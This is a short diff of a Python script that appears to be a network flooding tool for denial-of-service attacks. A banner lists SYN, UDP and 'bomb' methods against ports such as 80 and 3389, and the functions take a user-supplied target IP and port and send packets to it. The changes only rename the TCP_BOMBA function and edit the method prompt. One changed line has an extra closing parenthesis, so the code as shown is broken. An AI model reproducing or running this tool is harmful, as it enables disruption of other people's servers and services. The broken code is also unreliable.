@@ -26,13 +26,13 @@ banner = """
 \033[91m|   SYN    | 80  | 3389 |
 \033[91m|   UDP    |17091| 7777 |
 \033[91m| UDP-BOMB |17091| 7777 |
-\033[91m] TCP-BOMBA| 80  | 3389 |
+\033[91m] TCP-BOMB | 80  | 3389 |
 \033[91m|----------|------------|
 """
 
 print(logo)
 print(banner)
-method = str(input("Method (TCP, UDP, SYN, UDP,TCP_BOMBA) : "))
+method = str(input("Method (TCP, UDPBOMB, SYN, UDP,TCPBOMB) : "))
 
 def UDP():
     ip = str(input("IP : "))
@@ -68,7 +68,7 @@ def TCP():
 
         s.sendto(data, addr)
         
-def TCP_BOMBA(): 
+def TCPBOMB(): 
 	
      ip = str(input("IP : ")))
      port = int(input("PORT : "))
